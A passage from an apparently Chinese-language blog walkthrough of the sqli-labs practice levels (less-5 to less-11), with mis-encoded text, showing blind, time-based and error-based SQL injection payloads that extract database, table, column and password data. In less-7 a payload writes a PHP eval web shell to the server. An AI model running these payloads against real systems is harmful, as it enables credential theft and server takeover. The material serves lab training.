ä¸æ˜¾ç¤º</span><br><br></code></pre></td></tr></table></figure><p>åˆ©ç”¨é¡µé¢å†…å®¹çš„æ˜¾ç¤ºå’Œä¸æ˜¾ç¤ºï¼Œæ¥åˆ¤æ–­æˆ‘ä»¬æŸ¥è¯¢çš„å†…å®¹æ˜¯ä»€ä¹ˆã€‚å°†æˆ‘ä»¬æƒ³è¦æŸ¥è¯¢çš„å†…å®¹è¿›è¡Œæ‹†åˆ†ï¼Œç„¶åé€ä¸ªåˆ¤æ–­ã€‚ä¾‹å¦‚ï¼šæƒ³è¦çŸ¥é“æ•°æ®åº“åï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè¯¢é—®ç³»ç»Ÿï¼šâ€œç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ä¸æ˜¯aï¼Ÿâ€ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ç»§ç»­è¯¢é—®æ˜¯å¦ä¸ºbï¼Œç›´åˆ°é—®å‡ºç»“æœã€‚ç„¶åå†å»å¯»æ‰¾ç¬¬äºŒä¸ªå­—ç¬¦ã€‚</p><p>å¸¸ç”¨çš„å‡½æ•°ï¼š</p><ul><li>substr(string string,num start,num length);<br>stringä¸ºå­—ç¬¦ä¸²ï¼›startä¸ºèµ·å§‹ä½ç½®ï¼›lengthä¸ºé•¿åº¦ã€‚ï¼ˆmysqlä¸­çš„startæ˜¯ä»1å¼€å§‹çš„ï¼‰</li><li>left()(str,length);stræ˜¯è¦æå–å­å­—ç¬¦ä¸²çš„å­—ç¬¦ä¸²ã€‚lengthæ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼ŒæŒ‡å®šå°†ä»å·¦è¾¹è¿”å›çš„å­—ç¬¦æ•°ã€‚<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)=<span class="hljs-string">&quot;a&quot;</span>  --+<br># ä¸æ˜¾ç¤º<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)=<span class="hljs-string">&quot;s&quot;</span>  --+<br># æ­£å¸¸æ˜¾ç¤º<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-string">&quot;security&quot;</span>  --+<br># æ­£å¸¸æ˜¾ç¤º<br><br>?id=<span class="hljs-number">1</span>&#x27; and substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-number">0x7365637572697479</span>  --+<br># æ­£å¸¸æ˜¾ç¤º<br><br></code></pre></td></tr></table></figure>æˆ‘ä»¬å°†ä¸­é—´çš„database()ï¼Œæ›¿æ¢æˆå…¶ä»–çš„SQLè¯­å¥å°±å¯ä»¥æŸ¥è¯¢å…¶ä»–çš„ç»“æœäº†ã€‚</li></ul><h3 id="å»¶æ—¶æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥</h3><p>æ—¶é—´ç›²æ³¨é€šå¸¸åœ¨çœ‹ä¸åˆ°ä»»ä½•å›æ˜¾ä¿¡æ¯çš„æ—¶å€™å°è¯•ï¼Œæ—¶é—´ç›²æ³¨æ˜¯åœ¨å¸ƒå°”æ³¨å…¥çš„åŸºç¡€ä¸Šçš„ã€‚å¸ƒå°”æ³¨å…¥æ˜¯åˆ©ç”¨ç½‘ç«™è‡ªå¸¦çš„å›æ˜¾ï¼Œè€Œæ—¶é—´æ³¨å…¥åˆ™æ˜¯å°† true å’Œ false è½¬åŒ–ä¸ºä¸åŒçš„ç­‰å¾…æ—¶é—´ã€‚ç›´æ¥ä¿®æ”¹ä¸Šé¢çš„ Payload å¯å¾—ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?id=<span class="hljs-number">1</span>&#x27; and if(substr(database(), <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)=<span class="hljs-number">0x7365637572697479</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)  --+<br># æœ‰æ˜æ˜¾çš„å»¶æ—¶<br><br></code></pre></td></tr></table></figure><p>ç®€å•åˆ†æï¼š<br>è¿™ä¸ª lession å’Œå‰é¢çš„ä¸åŒç‚¹åœ¨äºå›æ˜¾æ–¹å¼ã€‚è¿™ä¸ª lession å¹¶ä¸ä¼šåƒå…ˆå‰ä¸€æ ·ï¼Œæ˜¾ç¤ºå¹¶è¿”å›æŸ¥è¯¢åˆ°çš„ä¿¡æ¯ï¼Œè€Œæ˜¯å‘Šè¯‰ä½ æ˜¯å¦æ­£ç¡®ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<br>$result=mysqli_query($con1, $sql);<br>$row = mysqli_fetch_array($result, MYSQLI_BOTH);<br><br><br>    <span class="hljs-keyword">if</span>($row)<br>    &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;    <br>      <span class="hljs-comment">// å…³é”®è¯­å¥</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are in...........&#x27;</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/font&gt;&quot;</span>;<br>      &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>    <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;<br>    print_r(mysqli_error($con1));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;    <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;    <br>    <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>é—­åˆæ–¹å¼:<code>id=&quot;$id&quot;</code></p><p>æµ‹è¯•é—­åˆæ–¹å¼ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># s You are in...........</span><br><br>?<span class="hljs-attribute">id</span>=1 --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤ºï¼ˆï¼‰</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1 --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&quot; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0 --+<br><span class="hljs-comment"># ä¸æ˜¾ç¤º</span><br><br></code></pre></td></tr></table></figure><p>å°† and åçš„å¼å­æ›¿æ¢ä¸º less-5 ä¸­çš„æŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥å’Œæ—¶é—´æ³¨å…¥å³å¯ã€‚</p><hr><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=((&#39;$id&#39;))</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><br><span class="xml">?id=1&#x27;)) --+</span><br><span class="xml"># é—­åˆSQLè¯­å¥</span><br><br><span class="xml">?id=1&#x27;)) union select 1, 2, &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&quot;pwd&quot;</span>]) <span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;/Users/littlechieh6/Documents/project/sqli-labs-php7/shell.php&#x27;--+</span><br><span class="xml"># ä¼šå°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°æœåŠ¡å™¨ç«¯çš„ç›®å½•ä¸‹ã€‚å¯ä»¥è€ƒè™‘å†™å…¥æœåŠ¡å™¨åå°</span><br><br></code></pre></td></tr></table></figure><p>æœ€åä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥å³å¯ getshellã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8F46C7D8-A92A-4165-BBD9-4C81A65E76F7.png"></p><hr><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code><br>å’Œå‰é¢å‡ é¢˜ä¸åŒç‚¹åœ¨äºï¼šä¸è¾“å‡ºæŠ¥é”™ä¿¡æ¯ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1<br><span class="hljs-comment"># You are in...........</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1--+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=0--+<br><span class="hljs-comment"># ä¸æ˜¾ç¤º</span><br><br><span class="hljs-comment"># è€ƒè™‘å‚è€ƒless-5ä¸­çš„å¸ƒå°”æ³¨å…¥è¿›è¡Œæµ‹è¯•</span><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> substr(database(), 1, 1)=<span class="hljs-string">&quot;a&quot;</span>  --+<br><span class="hljs-comment"># ä¸æ˜¾ç¤º</span><br><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> substr(database(), 1, 1)=<span class="hljs-string">&quot;s&quot;</span>  --+<br><span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤ºï¼Œä¿®æ”¹å‡½æ•°çš„å†…å®¹ï¼Œå³å¯å¾—åˆ°åé¢çš„å†…å®¹</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>æ— è®ºæ€ä¹ˆè¾“å…¥éƒ½æ˜¯è¿”å› You are inâ€¦â€¦ã€‚è€ƒè™‘ä½¿ç”¨æ—¶é—´ç›²æ³¨</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">--+</span><br><span class="hljs-comment"># ä½¿ç”¨--+æˆ–è€…%23ï¼Œå¦‚æœä½¿ç”¨#æµè§ˆå™¨å¯èƒ½ä¸è¿›è¡Œurlç¼–ç </span><br><br></code></pre></td></tr></table></figure><p>æ­¤å¤„id=1ï¼Œå¹¶ä¸”å‘ç°æœ‰å»¶æ—¶ã€‚</p><p>è¿™é‡Œä¾ç„¶è€ƒè™‘ä½¿ç”¨ if è¯­å¥æ¥è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼ˆif è¯­å¥æŒºåƒCè¯­è¨€çš„ä¸‰ç›®è¿ç®—ç¬¦çš„ï¼‰ã€‚ç±»ä¼¼å‰é¢çš„æ–¹æ³•ï¼Œä½¿ç”¨ if+sleep æ¥å…ˆè·å–æ•°æ®åº“åå­—çš„é•¿åº¦</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br># <span class="hljs-number">1.</span> äºŒåˆ†<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">0</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # å»¶æ—¶ï¼Œæ­£å¸¸æ‰§è¡Œ<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">0</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # ä¸å»¶æ—¶<br># ç”¨æ¥æµ‹è¯•ifè¯­å¥æ˜¯å¦æ­£å¸¸æ‰§è¡Œ<br><br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">10</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+ # ä¸å»¶æ—¶<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">5</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # å»¶æ—¶ï¼Œä»£è¡¨åœ¨ <span class="hljs-number">5</span>, <span class="hljs-number">10</span> ä¹‹é—´<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">8</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # ä¸å»¶æ—¶ï¼Œåœ¨ [<span class="hljs-number">8</span>, <span class="hljs-number">5</span>)<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">8</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  # å»¶æ—¶ï¼Œé•¿åº¦ä¸º<span class="hljs-number">8</span><br><br>#<span class="hljs-number">2.</span> é€ä¸ªæµ‹è¯•<br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">1</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  <br>?id=<span class="hljs-number">1</span>&#x27; and if(length(database())=<span class="hljs-number">2</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) --+  <br><br></code></pre></td></tr></table></figure><p>LEFT(str,len) è¿”å›æœ€å·¦è¾¹çš„ len ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œæˆ–è€… NULLã€‚</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br>mysql&gt; select left(<span class="hljs-emphasis">&#x27;foobarbar&#x27;</span>, 5);<br><span class="hljs-code">+----------------------+</span><br>| left(<span class="hljs-emphasis">&#x27;foobarbar&#x27;</span>, 5) |<br><span class="hljs-code">+----------------------+</span><br>| fooba                |<br><span class="hljs-code">+----------------------+</span><br>1 row in set (0.00 sec)<br><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ left æ¥çˆ†ç ´æ•°æ®åº“çš„åå­—</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 1)=&#x27;</span>a<span class="hljs-string">&#x27;, sleep(3), 1) --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;b&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>â€¦â€¦<br>â€¦â€¦<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 1)=&#x27;</span>s<span class="hljs-string">&#x27;, sleep(3), 1) --+ # æ˜æ˜¾å»¶æ—¶</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">2</span>)=<span class="hljs-string">&#x27;sa&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+ </span><br>â€¦â€¦<br>â€¦â€¦<br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left(database(), 2)=&#x27;</span>s<span class="hljs-string">e&#x27;, sleep(3), 1) --+ </span><br><span class="hljs-string"></span><br><span class="hljs-string"># ç±»ä¼¼ä¸Šé¢çš„æ–¹æ³•ï¼Œæ…¢æ…¢çš„å¢åŠ é•¿åº¦ï¼Œä¿®æ”¹éœ€è¦å¯¹æ¯”çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥å¾—åˆ°å®Œæ•´çš„æ•°æ®åº“å</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left(<span class="hljs-keyword">database</span>(), <span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;security&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+ # æ˜æ˜¾å»¶æ—¶</span><br><br></code></pre></td></tr></table></figure><ul><li><p>çˆ†è¡¨åçš„ Payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br>?id=1&#x27; and if(left((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>)=<span class="hljs-string">&#x27;r&#x27;</span> , <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼šlimit N,M : ç›¸å½“äº limit M offset N , ä»ç¬¬ N æ¡è®°å½•å¼€å§‹ï¼ˆä»0å¼€å§‹ï¼‰, è¿”å› M æ¡è®°å½•ã€‚è¿™é‡Œä½¿ç”¨çš„limit x,1 æŸ¥è¯¢ç¬¬xä¸ªè¡¨åã€‚</p></li><li><p>çˆ†å­—æ®µåçš„ Payload</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 4,1),8)=&#x27;</span><span class="hljs-keyword">password</span><span class="hljs-string">&#x27;, sleep(3), 1) --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">9</span>,<span class="hljs-number">1</span>),<span class="hljs-number">8</span>)=<span class="hljs-string">&#x27;username&#x27;</span>, sleep(<span class="hljs-number">3</span>), <span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure></li><li><p>çˆ†æ•°æ®çš„payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((select password <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>order by id limit 0,1),4)=<span class="hljs-string">&#x27;dumb&#x27;</span> , sleep(3), 1) --+<br>?<span class="hljs-attribute">id</span>=1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(left((select username <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>order by id limit 0,1),4)=<span class="hljs-string">&#x27;dumb&#x27;</span> , sleep(3), 1) --+<br><br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&quot;$id&quot;</code></p><p>å°†å•å¼•å·æ”¹ä¸ºåŒå¼•å·å³å¯ï¼Œå…¶ä»–ç›¸åŒã€‚</p><hr><h2 id="Hackbar"><a href="#Hackbar" class="headerlink" title="Hackbar"></a>Hackbar</h2><p>11 åˆ° 21 å…³éƒ½æ˜¯ POST å‹ï¼Œä½¿ç”¨ Hackbar å¯ä»¥æ–¹ä¾¿çš„å‘é€ POST æ•°æ®</p><ul><li>Chrome æœ‰å…è´¹çš„ Hackbar</li><li>firefox çš„ Hackbar å¯ä»¥è€ƒè™‘ç”¨è¿™ä¸ªé¡¹ç›®ï¼š<a href="https://github.com/ox01024/hackbar_crack">https://github.com/ox01024/hackbar_crack</a></li></ul><p>åŸºæœ¬æ“ä½œï¼š<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/B152DCD1-244C-418E-B784-37A5A28A0280.png"><br>enctype å±æ€§ï¼šè§„å®šåœ¨å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰åº”è¯¥å¦‚ä½•å¯¹è¡¨å•æ•°æ®è¿›è¡Œç¼–ç ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210114174430.png"></p><hr><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=&#39;$uname&#39;</code></p><p>å½“æˆ‘å°è¯•ä½¿ç”¨ Hackbar æäº¤è¡¨å•ï¼ŒHackbar ç»™å‡º form.submit is not a function çš„é”™è¯¯ä¿¡æ¯ã€‚<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/C3EB6EAC-10A7-43B1-8C43-7E168C81A664.png"><br>è§£å†³æ–¹æ³•ï¼šå°†è¡¨å•ä¸­çš„ &amp;submit=Submit åˆ æ‰ã€‚</p><p>åé¢æŒ‰ç…§å›æ˜¾æ–¹å¼çš„ç”±æ˜“åˆ°éš¾è¿›è¡Œæµ‹è¯•ï¼Œè¿™é¢˜èƒ½æ­£å¸¸å›æ˜¾ç”¨æˆ·åå’Œå¯†ç ï¼Œè¯´æ˜å¯ä»¥æ­£å¸¸ä½¿ç”¨è”åˆæ³¨å…¥è¿›è¡Œå›æ˜¾ã€‚</p><ul><li><p>è”åˆæ³¨å…¥ Payloadã€‚</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><br>passwd=D&amp;uname=Dum&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure></li><li><p>æŠ¥é”™æ³¨å…¥Payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select @@version),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># æ•°æ®åº“ç‰ˆæœ¬</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># æ•°æ®åº“å</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># è¡¨å</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># å­—æ®µå</span><br><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; and updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select group_concat(username,<span class="hljs-number">0</span>x<span class="hljs-number">3</span>a,password) from users),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment"># æ•°æ®</span><br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°å›æ˜¾XPATH syntax error: â€˜<del>8.0.19</del>â€˜ï¼Œå³å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥ï¼Œçˆ†ç ´ä¿¡æ¯åŒä¸Šé¢çš„æ–¹æ³•ã€‚</p></li><li><p>å¸ƒå°”æ³¨å…¥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; <span class="hljs-keyword">and</span> <span class="hljs-attribute">1</span>=1--+ # æ­£å¸¸ç™»é™†<br><span class="hljs-attribute">passwd</span>=D&amp;uname=Dumb&#x27; 